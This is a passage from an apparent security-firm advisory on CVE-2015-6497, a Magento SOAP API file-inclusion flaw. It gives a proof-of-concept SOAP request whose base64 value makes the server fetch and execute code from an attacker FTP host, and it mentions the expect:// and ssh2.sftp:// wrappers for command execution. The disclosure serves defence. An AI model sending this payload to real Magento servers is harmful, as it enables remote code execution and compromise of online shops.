But... wait a moment! According to the [official documentation](http://php.net/manual/en/language.oop5.basic.php) *"a valid class name starts with a letter or underscore, followed by any number of letters, numbers, or underscores".* That means an attacker cannot include arbitrary files via class names because it should not be possible to e.g. use path traversal sequences (../../) through them. But here comes the problem: there was a [bug](https://bugs.php.net/bug.php?id=62789) in the PHP core which allowed to invoke class autoloaders with invalid class names. This bug has been solved in [January 2014](http://www.php.net/ChangeLog-5.php#5.4.24) with the release of PHP versions 5.4.24 and 5.5.8.

### **How many vulnerable PHP installs are out there?**

Well, the bug which might enable this kind of vulnerability has been fixed by the PHP team at the beginning of 2014. But is this enough to say this kind of vulnerability should not pose any security concern? Maybe not... At the end of 2014 has been published a [blog post](http://blog.ircmaxell.com/2014/12/php-install-statistics.html) showing that 78% of all PHP installs were not secure, meaning they had at least one known security vulnerability. Antony Ferrara, the author of that post, used the statistics data from [W3Techs](http://w3techs.com/) in order to come to that conclusion. Let's try to do the same with regards to the PHP installs affected by the autoloading bug. In other words, let's check how many PHP websites are using PHP versions before 5.4.24 or 5.5.8.

[![](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEg3EM7BJaEsfNVf5ER6me7RRHTJv_OcYNGxTPNSy9eSz_sK4Q2k0BVlc5IHcUnCTR7s5uDsUtPLERaajRpFqJenNa_HItbVojHmAEMQH9Qk-4-Bfq7oyk3D3_0sM2LnGpQP3i-TxQBeteY/s400/php5.png)](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEg3EM7BJaEsfNVf5ER6me7RRHTJv_OcYNGxTPNSy9eSz_sK4Q2k0BVlc5IHcUnCTR7s5uDsUtPLERaajRpFqJenNa_HItbVojHmAEMQH9Qk-4-Bfq7oyk3D3_0sM2LnGpQP3i-TxQBeteY/s1600/php5.png)

The above table has been retrieved from the [PHP version 5](http://w3techs.com/technologies/details/pl-php/5/all) usage statistics page from W3Techs, as of September 10, 2015. It shows that at least **54.2%** of websites using PHP are affected by the autoloading bug (38.5% is using PHP 5.3, 14.7% is using PHP 5.2 and 1% is using PHP 5.1). Next step is to see how many websites are using vulnerable PHP 5.4.x and 5.5.x versions. The usage statistics page for [subversions of PHP 5.4](http://w3techs.com/technologies/details/pl-php/5.4/all) show that **12.7%** of websites using PHP are running a version before 5.4.24, while the usage statistics page for [subversions of PHP 5.5](http://w3techs.com/technologies/details/pl-php/5.5/all) show that **3.5%** of websites using PHP are running a version before 5.5.8. Overall, this means that **70.4%** of websites using PHP are affected by the autoloading bug. Roughly speaking, considering that according to the official website Magento powers more than 240,000 online shops, this could mean that over 150,000 websites powered by Magento might be affected by [CVE-2015-6497](https://cve.mitre.org/cgi-bin/cvename.cgi?name=2015-6497).

###

### **Technical description of the****vulnerability**

The vulnerability is caused by the *Mage\_Catalog\_Model\_Product\_Api\_V2::create()* method, which handles the "[catalogProductCreate](http://devdocs.magento.com/guides/m1x/api/soap/catalog/catalogProduct/catalog_product.create.html)" SOAP API call. The vulnerable code is located into the /app/code/core/Mage/Catalog/Model/Product/Api/V2.php script:

```
    public function create($type, $set, $sku, $productData, $store = null)
    {
        if (!$type || !$set || !$sku) {
            $this->_fault('data_invalid');
        }

        $this->_checkProductTypeExists($type);
        $this->_checkProductAttributeSet($set);

        /** @var $product Mage_Catalog_Model_Product */
        $product = Mage::getModel('catalog/product');
        $product->setStoreId($this->_getStoreId($store))
            ->setAttributeSetId($set)
            ->setTypeId($type)
            ->setSku($sku);

        if (!property_exists($productData, 'stock_data')) {
            //Set default stock_data if not exist in product data
            $_stockData = array('use_config_manage_stock' => 0);
            $product->setStockData($_stockData);
        }

```

This method expects the $productData parameter to be an array (in form of a stdClass object) and uses the *property\_exists()* function with it. However, an attacker can manipulate a SOAP request arbitrarily and send the $productData parameter in form of a string. In this case, if the string passed to the *property\_exists()* function is an unknown class, any registered autloader function will be triggered. When the *property\_exists()* function is called there's only one autoloader function registered, that is the *Varien\_Autoload::autoload()* method:

```
    public function autoload($class)
    {
        if ($this->_collectClasses) {
            $this->_arrLoadedClasses[self::$_scope][] = $class;
        }
        if ($this->_isIncludePathDefined) {
            $classFile =  COMPILER_INCLUDE_PATH . DIRECTORY_SEPARATOR . $class;
        } else {
            $classFile = str_replace(' ', DIRECTORY_SEPARATOR, ucwords(str_replace('_', ' ', $class)));
        }
        $classFile.= '.php';
        //echo $classFile;die();
        return include $classFile;
    }

```

In such a scenario, the $class parameter automatically passed to this method is exactly the same string value sent through the $productData parameter from the SOAP request, which after some replacementes and a ".php" string appended to it, is being used in a call to the *[include()](http://php.net/manual/it/function.include.php)* function. This may result in an arbitrary file inclusion (both from local or remote resources) and could be exploited to include and execute arbitrary PHP code. There are some conditions which should be met in order to exploit this vulnerability:

* an API user account with privileges to create a catalog product is required;
* in order to include arbitrary files from remote locations, Magento should run on PHP before
  5.4.24 or 5.5.8, because such versions have fixed the issue related to invalid class names
  in the autoloading process;
* in order to include arbitrary files from remote locations the "allow\_url\_include" directive
  must be set to On;
* in case the allow\_url\_include directive is set to Off it might still be possible to include
  files from remote locations using the ssh2.sftp:// wrapper (which requires the SSH2 extension
  to be installed) or execute arbitrary OS commands leveraging the expect:// wrapper (which
  requires the Expect extension to be installed).

NOTE: if Magento is running on PHP version after 5.4.23 or 5.5.7 the vulnerability
could still be exploited by including a local file with a .php extension (something like /tmp/test.php).
If Magento is running on PHP before 5.3.4 the vulnerability could be exploited to include arbitrary
local files with any extension (e.g. a session file containing malicious PHP code injected by the
attacker) because NULL bytes are allowed within the path (see [CVE-2006-7243](https://cve.mitre.org/cgi-bin/cvename.cgi?name=2006-7243)).

### **Proof of Concept**

Once logged in with valid API credentials, an attacker could send a SOAP request like the following in order to try to exploit the vulnerability:
> POST /magento/index.php/api/v2\_soap HTTP/1.0
>
> Host: localhost
>
> Content-Length: 804
>
> Connection: close
>
>
>
> <?xml version="1.0" encoding="UTF-8"?>
>
> <SOAP-ENV:Envelope xmlns:SOAP-ENV="http://schemas.xmlsoap.org/soap/envelope/" xmlns:ns1="urn:Magento" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:SOAP-ENC="http://schemas.xmlsoap.org/soap/encoding/" SOAP-ENV:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/">
>
> <SOAP-ENV:Body>
>
> <ns1:catalogProductCreate>
>
> <sessionId xsi:type="xsd:string">VALID\_SESSION</sessionId>
>
> <type xsi:type="xsd:string">simple</type>
>
> <set xsi:type="xsd:string">4</set>
>
> <sku xsi:type="xsd:string">test</sku>
>
> <productData xsi:type="xsd:base64Binary">ZnRwOi8vYXR0YWNrZXI6cGFzc3dvcmRAYXR0YWNrZXJfc2VydmVyLmNvbS9ob21lL2F0dGFja2VyL2V2aWw=</productData>
>
> <storeView xsi:nil="true"/>
>
> </ns1:catalogProductCreate>
>
> </SOAP-ENV:Body>
>
> </SOAP-ENV:Envelope>

The  "productData" parameter has been encoded in base64 within the SOAP request, and the decoded string is the following:

> **ftp://attacker:password@attacker\_server.com/home/attacker/evil**

This means that leveraging the [ftp:// wrapper](http://php.net/manual/en/wrappers.ftp.php), an attacker might be able to force Magento to load and execute malicious code from a FTP server under its control. In this example, the attacker only has to put the malicious code under /home/attacker/evil.php. However, as we said before, other PHP wrappers might be abused, potentially leading to direct arbitrary PHP code execution.

By

[Egidio Romano](https://www.blogger.com/profile/14760841123995860416 "author profile")

at

[12:32 AM](https://blog.mindedsecurity.com/2015/09/autoloaded-file-inclusion-in-magento.html "permanent link")

[3 comments
:](https://blog.mindedsecurity.com/2015/09/autoloaded-file-inclusion-in-magento.html#comment-form)

[![](//img2.blogblog.com/img/icon18_edit_allbkg.gif)](https://www.blogger.com/post-edit.g?blogID=7122745763234660283&postID=8106901234847721037&from=pencil "Edit Post")

[Email This](https://www.blogger.com/share-post.g?blogID=7122745763234660283&postID=8106901234847721037&target=email "Email This")
[BlogThis!](https://www.blogger.com/share-post.g?blogID=7122745763234660283&postID=8106901234847721037&target=blog "BlogThis!")
[Share to X](https://www.blogger.com/share-post.g?blogID=7122745763234660283&postID=8106901234847721037&target=twitter "Share to X")
[Share to Facebook](https://www.blogger.com/share-post.g?blogID=7122745763234660283&postID=8106901234847721037&target=facebook "Share to Facebook")
[Share to Pinterest](https://www.blogger.com/share-post.g?blogID=7122745763234660283&postID=8106901234847721037&target=pinterest "Share to Pinterest")

Labels:
[Advisory](https://blog.mindedsecurity.com/search/label/Advisory)
,
[Autoloaded File Inclusion](https://blog.mindedsecurity.com/search/label/Autoloaded%20File%20Inclusion)
,
[CVE-2015-6497](https://blog.mindedsecurity.com/search/label/CVE-2015-6497)
,
[Magento](https://blog.mindedsecurity.com/search/label/Magento)
,
[Remote Code Execution](https://blog.mindedsecurity.com/search/label/Remote%20Code%20Execution)

[Older Posts](https://blog.mindedsecurity.com/search/label/Autoloaded%20File%20Inclusion?updated-max=2015-09-11T00:32:00-07:00&max-results=20&start=20&by-date=false "Older Posts")

[Home](https://blog.mindedsecurity.com/)

Subscribe to:
[Posts
(
Atom
)](https://blog.mindedsecurity.com/feeds/posts/default)

##

## Labels

* [3rd party javascript](https://blog.mindedsecurity.com/search/label/3rd%20party%20javascript)
  (
  2
  )
* [absolute path check](https://blog.mindedsecurity.com/search/label/absolute%20path%20check)
  (
  1
  )
* [Adobe](https://blog.mindedsecurity.com/search/label/Adobe)
  (
  3
  )
* [Advisory](https://blog.mindedsecurity.com/search/label/Advisory)
  (
  5
  )
* [adware](https://blog.mindedsecurity.com/search/label/adware)
  (
  1
  )
* [AFNetworking](https://blog.mindedsecurity.com/search/label/AFNetworking)
  (
  1
  )
* [agile](https://blog.mindedsecurity.com/search/label/agile)
  (
  1
  )
* [AMT](https://blog.mindedsecurity.com/search/label/AMT)
  (
  1
  )
* [Android](https://blog.mindedsecurity.com/search/label/Android)
  (
  1
  )
* [Android Security](https://blog.mindedsecurity.com/search/label/Android%20Security)
  (
  6
  )
* [Anti-Tampering](https://blog.mindedsecurity.com/search/label/Anti-Tampering)
  (
  2
  )
* [Antitamper](https://blog.mindedsecurity.com/search/label/Antitamper)
  (
  2
  )
* [Applet Security](https://blog.mindedsecurity.com/search/label/Applet%20Security)
  (
  6
  )
* [Application Security](https://blog.mindedsecurity.com/search/label/Application%20Security)
  (
  23
  )
* [appsec](https://blog.mindedsecurity.com/search/label/appsec)
  (
  1
  )
* [Arbitrary Code Execution](https://blog.mindedsecurity.com/search/label/Arbitrary%20Code%20Execution)
  (
  4
  )
* [architecture](https://blog.mindedsecurity.com/search/label/architecture)
  (
  1
  )
* [asp.net](https://blog.mindedsecurity.com/search/label/asp.net)
  (
  2
  )
* [ast](https://blog.mindedsecurity.com/search/label/ast)
  (
  1
  )
* [attacks](https://blog.mindedsecurity.com/search/label/attacks)
  (
  1
  )
* [Authentication](https://blog.mindedsecurity.com/search/label/Authentication)
  (
  1
  )
* Autoloaded File Inclusion

  (
  1
  )
* [Automotive](https://blog.mindedsecurity.com/search/label/Automotive)
  (
  1
  )
* [Banking](https://blog.mindedsecurity.com/search/label/Banking)
  (
  4
  )
* [Banking Malware](https://blog.mindedsecurity.com/search/label/Banking%20Malware)
  (
  1
  )
* [blackbox](https://blog.mindedsecurity.com/search/label/blackbox)
  (
  1
  )
* [blueclosure](https://blog.mindedsecurity.com/search/label/blueclosure)
  (
  1
  )
* [burp](https://blog.mindedsecurity.com/search/label/burp)
  (
  1
  )
* [canonicalization](https://blog.mindedsecurity.com/search/label/canonicalization)
  (
  1
  )
* [Certificate Pinning](https://blog.mindedsecurity.com/search/label/Certificate%20Pinning)
  (
  1
  )
* [chat](https://blog.mindedsecurity.com/search/label/chat)
  (
  1
  )
* [Client Side HTTP Parameter Pollution](https://blog.mindedsecurity.com/search/label/Client%20Side%20HTTP%20Parameter%20Pollution)
  (
  1
  )
* [cloud](https://blog.mindedsecurity.com/search/label/cloud)
  (
  1
  )
* [cloud browsing](https://blog.mindedsecurity.com/search/label/cloud%20browsing)
  (
  1
  )
* [Code Protection](https://blog.mindedsecurity.com/search/label/Code%20Protection)
  (
  2
  )
* [compliance](https://blog.mindedsecurity.com/search/label/compliance)
  (
  1
  )
* [Concrete5](https://blog.mindedsecurity.com/search/label/Concrete5)
  (
  1
  )
* [Content Security Policy](https://blog.mindedsecurity.com/search/label/Content%20Security%20Policy)
  (
  1
  )
* [CORS](https://blog.mindedsecurity.com/search/label/CORS)
  (
  1
  )
* [Cross Site Scripting](https://blog.mindedsecurity.com/search/label/Cross%20Site%20Scripting)
  (
  7
  )
* [CVE-2015-6497](https://blog.mindedsecurity.com/search/label/CVE-2015-6497)
  (
  1
  )
* [CVE-2021-44228](https://blog.mindedsecurity.com/search/label/CVE-2021-44228)
  (
  1
  )
* [DAB](https://blog.mindedsecurity.com/search/label/DAB)
  (
  1
  )
* [defense](https://blog.mindedsecurity.com/search/label/defense)
  (
  1
  )
* [deobfuscation](https://blog.mindedsecurity.com/search/label/deobfuscation)
  (
  2
  )
* [DeviceSecurity](https://blog.mindedsecurity.com/search/label/DeviceSecurity)
  (
  2
  )
* [DEVSECOPS](https://blog.mindedsecurity.com/search/label/DEVSECOPS)
  (
  1
  )
* [dll](https://blog.mindedsecurity.com/search/label/dll)
  (
  1
  )
* [DNS Rebinding](https://blog.mindedsecurity.com/search/label/DNS%20Rebinding)
  (
  2
  )
* [DOM Based XSS](https://blog.mindedsecurity.com/search/label/DOM%20Based%20XSS)
  (
  9
  )
* [Dom Xss](https://blog.mindedsecurity.com/search/label/Dom%20Xss)
  (
  15
  )
* [DOMinator](https://blog.mindedsecurity.com/search/label/DOMinator)
  (
  11
  )
* [DOMinatorPro](https://blog.mindedsecurity.com/search/label/DOMinatorPro)
  (
  9
  )
* [download](https://blog.mindedsecurity.com/search/label/download)
  (
  1
  )
* [Dyre](https://blog.mindedsecurity.com/search/label/Dyre)
  (
  1
  )
* [Encryption](https://blog.mindedsecurity.com/search/label/Encryption)
  (
  3
  )
* [Expression Language Injection](https://blog.mindedsecurity.com/search/label/Expression%20Language%20Injection)
  (
  3
  )
* [fixing](https://blog.mindedsecurity.com/search/label/fixing)
  (
  1
  )
* [Flex](https://blog.mindedsecurity.com/search/label/Flex)
  (
  2
  )
* [Flutter](https://blog.mindedsecurity.com/search/label/Flutter)
  (
  1
  )
* [gameover](https://blog.mindedsecurity.com/search/label/gameover)
  (
  1
  )
* [Google Plus One](https://blog.mindedsecurity.com/search/label/Google%20Plus%20One)
  (
  1
  )
* [google security](https://blog.mindedsecurity.com/search/label/google%20security)
  (
  1
  )
* [Http Parameter Pollution](https://blog.mindedsecurity.com/search/label/Http%20Parameter%20Pollution)
  (
  2
  )
* [Http Request Splitting](https://blog.mindedsecurity.com/search/label/Http%20Request%20Splitting)
  (
  1
  )
* [Information Disclosure](https://blog.mindedsecurity.com/search/label/Information%20Disclosure)
  (
  2
  )
* [innovation](https://blog.mindedsecurity.com/search/label/innovation)
  (
  2
  )
* [intruder](https://blog.mindedsecurity.com/search/label/intruder)
  (
  1
  )
* [iOS](https://blog.mindedsecurity.com/search/label/iOS)
  (
  2
  )
* [iOS Security](https://blog.mindedsecurity.com/search/label/iOS%20Security)
  (
  7
  )
* [IoT](https://blog.mindedsecurity.com/search/label/IoT)
  (
  2
  )
* [ISO21434](https://blog.mindedsecurity.com/search/label/ISO21434)
  (
  1
  )
* [J2EE](https://blog.mindedsecurity.com/search/label/J2EE)
  (
  1
  )
* [Java](https://blog.mindedsecurity.com/search/label/Java)
  (
  5
  )
* [Java Faces](https://blog.mindedsecurity.com/search/label/Java%20Faces)
  (
  1
  )
* [Java Security](https://blog.mindedsecurity.com/search/label/Java%20Security)
  (
  2
  )
* [javascript](https://blog.mindedsecurity.com/search/label/javascript)
  (
  4
  )
* [JavaScript Security](https://blog.mindedsecurity.com/search/label/JavaScript%20Security)
  (
  2
  )
* [JNLP Security](https://blog.mindedsecurity.com/search/label/JNLP%20Security)
  (
  1
  )
* [jQuery](https://blog.mindedsecurity.com/search/label/jQuery)
  (
  2
  )
* [JSON](https://blog.mindedsecurity.com/search/label/JSON)
  (
  1
  )
* [Libraries Security](https://blog.mindedsecurity.com/search/label/Libraries%20Security)
  (
  1
  )
* [Liferay](https://blog.mindedsecurity.com/search/label/Liferay)
  (
  1
  )
* [Linkedin.com](https://blog.mindedsecurity.com/search/label/Linkedin.com)
  (
  1
  )
* [Log4J](https://blog.mindedsecurity.com/search/label/Log4J)
  (
  1
  )
* [Magento](https://blog.mindedsecurity.com/search/label/Magento)
  (
  1
  )
* [malware](https://blog.mindedsecurity.com/search/label/malware)
  (
  9
  )
* [malware detector](https://blog.mindedsecurity.com/search/label/malware%20detector)
  (
  1
  )
* [MAPT](https://blog.mindedsecurity.com/search/label/MAPT)
  (
  4
  )
* [maxthon](https://blog.mindedsecurity.com/search/label/maxthon)
  (
  1
  )
* [microservices](https://blog.mindedsecurity.com/search/label/microservices)
  (
  1
  )
* [MitM](https://blog.mindedsecurity.com/search/label/MitM)
  (
  2
  )
* [Mobile](https://blog.mindedsecurity.com/search/label/Mobile)
  (
  5
  )
* [Mobile Security](https://blog.mindedsecurity.com/search/label/Mobile%20Security)
  (
  4
  )
* [MSTG](https://blog.mindedsecurity.com/search/label/MSTG)
  (
  3
  )
* [mvc](https://blog.mindedsecurity.com/search/label/mvc)
  (
  1
  )
* [Obfuscation](https://blog.mindedsecurity.com/search/label/Obfuscation)
  (
  3
  )
* [Omniture](https://blog.mindedsecurity.com/search/label/Omniture)
  (
  2
  )
* [Oracle NetBeans](https://blog.mindedsecurity.com/search/label/Oracle%20NetBeans)
  (
  1
  )
* [OWASP](https://blog.mindedsecurity.com/search/label/OWASP)
  (
  6
  )
* [OWASP 5D](https://blog.mindedsecurity.com/search/label/OWASP%205D)
  (
  2
  )
* [OWASP SAMM](https://blog.mindedsecurity.com/search/label/OWASP%20SAMM)
  (
  2
  )
* [OWASP Summit](https://blog.mindedsecurity.com/search/label/OWASP%20Summit)
  (
  1
  )
* [OWASP Top Ten](https://blog.mindedsecurity.com/search/label/OWASP%20Top%20Ten)
  (
  3
  )
* [p2p encryption](https://blog.mindedsecurity.com/search/label/p2p%20encryption)
  (
  1
  )
* [path traversal](https://blog.mindedsecurity.com/search/label/path%20traversal)
  (
  3
  )
* [peer to peer encryption](https://blog.mindedsecurity.com/search/label/peer%20to%20peer%20encryption)
  (
  1
  )
* [Polyglots](https://blog.mindedsecurity.com/search/label/Polyglots)
  (
  1
  )
* [Primefaces](https://blog.mindedsecurity.com/search/label/Primefaces)
  (
  1
  )
* [privacy](https://blog.mindedsecurity.com/search/label/privacy)
  (
  1
  )
* [puffin](https://blog.mindedsecurity.com/search/label/puffin)
  (
  1
  )
* [RAT](https://blog.mindedsecurity.com/search/label/RAT)
  (
  1
  )
* [RAT WARS](https://blog.mindedsecurity.com/search/label/RAT%20WARS)
  (
  1
  )
* [RATDET](https://blog.mindedsecurity.com/search/label/RATDET)
  (
  1
  )
* [RATWARS](https://blog.mindedsecurity.com/search/label/RATWARS)
  (
  1
  )
* [RDS](https://blog.mindedsecurity.com/search/label/RDS)
  (
  1
  )
* [Remote Code Execution](https://blog.mindedsecurity.com/search/label/Remote%20Code%20Execution)
  (
  3
  )
* [remote working](https://blog.mindedsecurity.com/search/label/remote%20working)
  (
  1
  )
* [reverse engineering](https://blog.mindedsecurity.com/search/label/reverse%20engineering)
  (
  1
  )
* [Same Origin Policy](https://blog.mindedsecurity.com/search/label/Same%20Origin%20Policy)
  (
  1
  )
* [sanitization](https://blog.mindedsecurity.com/search/label/sanitization)
  (
  1
  )
* [sast](https://blog.mindedsecurity.com/search/label/sast)
  (
  3
  )
* [Screen Control](https://blog.mindedsecurity.com/search/label/Screen%20Control)
  (
  1
  )
* [screenshot security](https://blog.mindedsecurity.com/search/label/screenshot%20security)
  (
  2
  )
* [SDL](https://blog.mindedsecurity.com/search/label/SDL)
  (
  2
  )
* [security](https://blog.mindedsecurity.com/search/label/security)
  (
  2
  )
* [security tools](https://blog.mindedsecurity.com/search/label/security%20tools)
  (
  1
  )
* [semgrep](https://blog.mindedsecurity.com/search/label/semgrep)
  (
  3
  )
* [Sharepoint](https://blog.mindedsecurity.com/search/label/Sharepoint)
  (
  1
  )
* [slack](https://blog.mindedsecurity.com/search/label/slack)
  (
  1
  )
* [Software Security Governance](https://blog.mindedsecurity.com/search/label/Software%20Security%20Governance)
  (
  1
  )
* [source code](https://blog.mindedsecurity.com/search/label/source%20code)
  (
  1
  )
* [Spring MVC](https://blog.mindedsecurity.com/search/label/Spring%20MVC)
  (
  1
  )
* [SQL Injection](https://blog.mindedsecurity.com/search/label/SQL%20Injection)
  (
  1
  )
* [SSL](https://blog.mindedsecurity.com/search/label/SSL)
  (
  2
  )
* [static analysis](https://blog.mindedsecurity.com/search/label/static%20analysis)
  (
  1
  )
* [Stored DOM Based XSS](https://blog.mindedsecurity.com/search/label/Stored%20DOM%20Based%20XSS)
  (
  1
  )
* [STRATEGY](https://blog.mindedsecurity.com/search/label/STRATEGY)
  (
  1
  )
* [superfish](https://blog.mindedsecurity.com/search/label/superfish)
  (
  1
  )
* [Supply Chain Security](https://blog.mindedsecurity.com/search/label/Supply%20Chain%20Security)
  (
  1
  )
* [SVG](https://blog.mindedsecurity.com/search/label/SVG)
  (
  1
  )
* [Swift](https://blog.mindedsecurity.com/search/label/Swift)
  (
  1
  )
* [TARA](https://blog.mindedsecurity.com/search/label/TARA)
  (
  1
  )
* [Telerik UI](https://blog.mindedsecurity.com/search/label/Telerik%20UI)
  (
  1
  )
* [TESTABLE](https://blog.mindedsecurity.com/search/label/TESTABLE)
  (
  1
  )
* [testing](https://blog.mindedsecurity.com/search/label/testing)
  (
  1
  )
* [Threat Modeling](https://blog.mindedsecurity.com/search/label/Threat%20Modeling)
  (
  1
  )
* [twitter](https://blog.mindedsecurity.com/search/label/twitter)
  (
  1
  )
* [UNECE R155](https://blog.mindedsecurity.com/search/label/UNECE%20R155)
  (
  1
  )
* [unzip directory traversal](https://blog.mindedsecurity.com/search/label/unzip%20directory%20traversal)
  (
  1
  )
* [UPnP](https://blog.mindedsecurity.com/search/label/UPnP)
  (
  2
  )
* [validation](https://blog.mindedsecurity.com/search/label/validation)
  (
  1
  )
* [Vulnerabilities statistics](https://blog.mindedsecurity.com/search/label/Vulnerabilities%20statistics)
  (
  1
  )
* [WAF](https://blog.mindedsecurity.com/search/label/WAF)
  (
  1
  )
* [WAPT](https://blog.mindedsecurity.com/search/label/WAPT)
  (
  1
  )
* [Web Application Firewall](https://blog.mindedsecurity.com/search/label/Web%20Application%20Firewall)
  (
  1
  )
* [web architecture security](https://blog.mindedsecurity.com/search/label/web%20architecture%20security)
  (
  1
  )
* [Web Attacks](https://blog.mindedsecurity.com/search/label/Web%20Attacks)
  (
  23
  )
* [web cache](https://blog.mindedsecurity.com/search/label/web%20cache)
  (
  1
  )
* [web injection](https://blog.mindedsecurity.com/search/label/web%20injection)
  (
  4
  )
* [Web Security](https://blog.mindedsecurity.com/search/label/Web%20Security)
  (
  23
  )
* [Windows Phone Security](https://blog.mindedsecurity.com/search/label/Windows%20Phone%20Security)
  (
  1
  )
* [WWeb Security](https://blog.mindedsecurity.com/search/label/WWeb%20Security)
  (
  2
  )
* [zeus p2p](https://blog.mindedsecurity.com/search/label/zeus%20p2p)
  (
  3
  )

## Blog Archive

* [May](https://blog.mindedsecurity.com/2024/05/)
  (
  1
  )
* [April](https://blog.mindedsecurity.com/2024/04/)
  (
  1
  )
* [March](https://blog.mindedsecurity.com/2024/03/)
  (
  1
  )
* [October](https://blog.mindedsecurity.com/2023/10/)
  (
  1
  )
* [June](https://blog.mindedsecurity.com/2023/06/)
  (
  1
  )
* [March](https://blog.mindedsecurity.com/2023/03/)
  (
  1
  )
* [February](https://blog.mindedsecurity.com/2023/02/)
  (
  1
  )
* [July](https://blog.mindedsecurity.com/2022/07/)
  (
  1
  )
* [December](https://blog.mindedsecurity.com/2021/12/)
  (
  1
  )
* [August](https://blog.mindedsecurity.com/2021/08/)
  (
  1
  )
* [May](https://blog.mindedsecurity.com/2021/05/)
  (
  1
  )
* [February](https://blog.mindedsecurity.com/2021/02/)
  (
  1
  )
* [January](https://blog.mindedsecurity.com/2021/01/)
  (
  1
  )
* [November](https://blog.mindedsecurity.com/2020/11/)
  (
  1
  )
* [October](https://blog.mindedsecurity.com/2020/10/)
  (
  1
  )
* [July](https://blog.mindedsecurity.com/2020/07/)
  (
  1
  )
* [June](https://blog.mindedsecurity.com/2020/06/)
  (
  1
  )
* [May](https://blog.mindedsecurity.com/2020/05/)
  (
  1
  )
* [April](https://blog.mindedsecurity.com/2020/04/)
  (
  1
  )
* [March](https://blog.mindedsecurity.com/2020/03/)
  (
  1
  )
* [February](https://blog.mindedsecurity.com/2020/02/)
  (
  1
  )
* [April](https://blog.mindedsecurity.com/2019/04/)
  (
  2
  )
* [October](https://blog.mindedsecurity.com/2018/10/)
  (
  3
  )
* [September](https://blog.mindedsecurity.com/2018/09/)
  (
  3
  )
* [July](https://blog.mindedsecurity.com/2018/07/)
  (
  1
  )
* [May](https://blog.mindedsecurity.com/2018/05/)
  (
  1
  )
* [April](https://blog.mindedsecurity.com/2018/04/)
  (
  2
  )
* [November](https://blog.mindedsecurity.com/2017/11/)
  (
  1
  )
* [June](https://blog.mindedsecurity.com/2017/06/)
  (
  1
  )
* [February](https://blog.mindedsecurity.com/2016/02/)
  (
  2
  )
* [January](https://blog.mindedsecurity.com/2016/01/)
  (
  1
  )
* [November](https://blog.mindedsecurity.com/2015/11/)
  (
  2
  )
* [October](https://blog.mindedsecurity.com/2015/10/)
  (
  1
  )
* [September](https://blog.mindedsecurity.com/2015/09/)
  (
  1
  )
* [August](https://blog.mindedsecurity.com/2015/08/)
  (
  1
  )
* [June](https://blog.mindedsecurity.com/2015/06/)
  (
  1
  )
* [April](https://blog.mindedsecurity.com/2015/04/)
  (
  2
  )
* [March](https://blog.mindedsecurity.com/2015/03/)
  (
  4
  )
* [February](https://blog.mindedsecurity.com/2015/02/)
  (
  1
  )
* [September](https://blog.mindedsecurity.com/2014/09/)
  (
  1
  )
* [August](https://blog.mindedsecurity.com/2014/08/)
  (
  1
  )
* [June](https://blog.mindedsecurity.com/2014/06/)
  (
  1
  )
* [October](https://blog.mindedsecurity.com/2013/10/)
  (
  1
  )
* [April](https://blog.mindedsecurity.com/2013/04/)
  (
  1
  )
* [February](https://blog.mindedsecurity.com/2013/02/)
  (
  2
  )
* [November](https://blog.mindedsecurity.com/2012/11/)
  (
  2
  )
* [October](https://blog.mindedsecurity.com/2012/10/)
  (
  3
  )
* [September](https://blog.mindedsecurity.com/2012/09/)
  (
  4
  )
* [June](https://blog.mindedsecurity.com/2012/06/)
  (
  1
  )
* [October](https://blog.mindedsecurity.com/2011/10/)
  (
  1
  )
* [September](https://blog.mindedsecurity.com/2011/09/)
  (
  1
  )
* [August](https://blog.mindedsecurity.com/2011/08/)
  (
  2
  )
* [July](https://blog.mindedsecurity.com/2011/07/)
  (
  2
  )
* [May](https://blog.mindedsecurity.com/2011/05/)
  (
  2
  )
* [April](https://blog.mindedsecurity.com/2011/04/)
  (
  2
  )
* [March](https://blog.mindedsecurity.com/2011/03/)
  (
  1
  )
* [October](https://blog.mindedsecurity.com/2010/10/)
  (
  8
  )
* [September](https://blog.mindedsecurity.com/2010/09/)
  (
  3
  )
* [August](https://blog.mindedsecurity.com/2010/08/)
  (
  1
  )
* [June](https://blog.mindedsecurity.com/2010/06/)
  (
  1
  )
* [April](https://blog.mindedsecurity.com/2010/04/)
  (
  4
  )
* [March](https://blog.mindedsecurity.com/2010/03/)
  (
  1
  )
* [December](https://blog.mindedsecurity.com/2009/12/)
  (
  1
  )
* [November](https://blog.mindedsecurity.com/2009/11/)
  (
  1
  )
* [October](https://blog.mindedsecurity.com/2009/10/)
  (
  1
  )
* [May](https://blog.mindedsecurity.com/2009/05/)
  (
  4
  )
* [February](https://blog.mindedsecurity.com/2009/02/)
  (
  2
  )
* [January](https://blog.mindedsecurity.com/2009/01/)
  (
  1
  )

####

Minded Security was established in Italy in 2007

with a focus on supporting businesses and

organizations to build secure products
 and services.

##### Services

* Training
* Testing
* Consulting
* Request a brochure

##### Information

* The Company
* blueclosure
* AMT – Banking Malware Detector
* Contact us
* Privacy Policy

##### Newsletter

©2015 Minded Security S.r.l. The Software Security Company - VAT IT05756380480

[Back to top](#top)



=== Content from blog.mindedsecurity.com_eb3ff7f1_20250124_161721.html ===


[Subscribe our newsletter](https://mindedsecurity.com/newsletter)

[Minded Security](https://mindedsecurity.com)

* Industry
  + [Automotive/Maritime](https://mindedsecurity.com/industry/automotive-maritime/ "Automotive/Maritime")
  + [Financial](https://mindedsecurity.com/industry/financial/ "Financial")
  + [GDO](https://mindedsecurity.com/industry/gdo/ "GDO")
  + [Industrial Control Systems](https://mindedsecurity.com/industry/industrial-control-systems/ "Industrial Control Systems")
  + [IoT Security](https://mindedsecurity.com/industry/iot-security/ "IoT Security")
  + [Healthcare](https://mindedsecurity.com/industry/healthcare/ "Healthcare")
  + [Government](https://mindedsecurity.com/industry/government/ "Government")
* [Services](https://mindedsecurity.com/our-services/ "Services")
  + [Training](https://mindedsecurity.com/our-services/training/ "Training")
    - [Security Hackaton](https://mindedsecurity.com/services/training/security-hackaton/ "Security Hackaton")
    - [Advanced On-site Training](https://mindedsecurity.com/services/training/advanced-on-site-training/ "Advanced On-site Training")
    - [BlueClosure Training](https://mindedsecurity.com/services/training/blueclosure-training/ "BlueClosure Training")
    - [High Level Training](https://mindedsecurity.com/services/training/high-level-training/ "High Level Training")
    - [Webinar](https://mindedsecurity.com/services/training/webinar/ "Webinar")
